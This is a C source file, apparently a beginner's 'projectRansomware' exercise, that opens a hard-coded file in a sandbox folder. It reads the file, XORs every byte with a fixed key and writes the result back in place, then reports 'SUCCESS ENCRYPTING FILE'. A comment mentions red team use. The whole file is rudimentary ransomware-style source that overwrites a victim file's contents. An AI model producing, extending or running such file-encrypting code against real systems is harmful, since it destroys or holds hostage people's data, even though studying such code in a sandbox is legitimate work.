#include <windows.h>
#include <stdio.h>
#include <string.h>


HANDLE hFile;
HANDLE hHeap;
LARGE_INTEGER fileSize;
BOOL okGetsize;
LPVOID heapBuffer;
BOOL okRead;
DWORD bytesRead;
BOOL okWrite;
DWORD bytesWritten;

int fileCreate(void){
	hFile = CreateFileW(
		L"C:\\Users\\USER\\Desktop\\C_code\\c_console\\day10\\projectRansomware\\testSandbox\\target.txt",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if(hFile == INVALID_HANDLE_VALUE){
		printf("PROBLEM ACCESSING FOLDER: %lu\n", GetLastError());
		return 1;
	}
	printf("\n[|*|]FILE ACCESS SUCCESSFUL\n"); //note that these comments are just debug,,, ofcourse there aint no way they are used for real in a red team env
	return 0;
}

int fileRead(void){
	okGetsize = GetFileSizeEx(
		hFile,
		&fileSize
	);
	if(!okGetsize){
		printf("ERROR GETTING FILE SIZE: %lu\n", GetLastError());
		return 1;
	}

	hHeap = GetProcessHeap();

	heapBuffer = HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		fileSize.QuadPart
	);
	if(heapBuffer == NULL){
		printf("ERROR WITH HEAP ALLOCATION: %lu\n", GetLastError());
		return 1;
	}

	okRead = ReadFile(
		hFile,
		heapBuffer,
		(DWORD)fileSize.QuadPart,
		&bytesRead,
		NULL
	);
	if(!okRead){
		printf("ERROR READING FILE: %lu\n", GetLastError());
		return 1;
	}
	printf("\n[|*|]FILE READ SUCCESSFULLY\n");
	return 0;
}

int fileWrite(void){
	BYTE *dataBuffer;
	dataBuffer = (BYTE *)heapBuffer;
	BYTE key = 0x5A;
	DWORD i;
	LARGE_INTEGER distance;
	distance.QuadPart = 0;
	
	for(i = 0; i < bytesRead; i++){
		dataBuffer[i] = dataBuffer[i] ^ key;
	}

	SetFilePointerEx(
		hFile,
		distance,
		NULL,
		FILE_BEGIN
	);

	okWrite = WriteFile(
		hFile,
		heapBuffer,
		bytesRead,
		&bytesWritten,
		NULL
	);
	if(!okWrite){
		printf("ERROR WRITING TO FILE: %lu\n", GetLastError());
		CloseHandle(hFile);
		return 1;
	}
	printf("\n[|*|]SUCCESS ENCRYPTING FILE\n");
	return 0;
	
}


int main(void){
	fileCreate();
	Sleep(2000);
	fileRead();
	Sleep(2000);
	fileWrite();
	return 0;
}
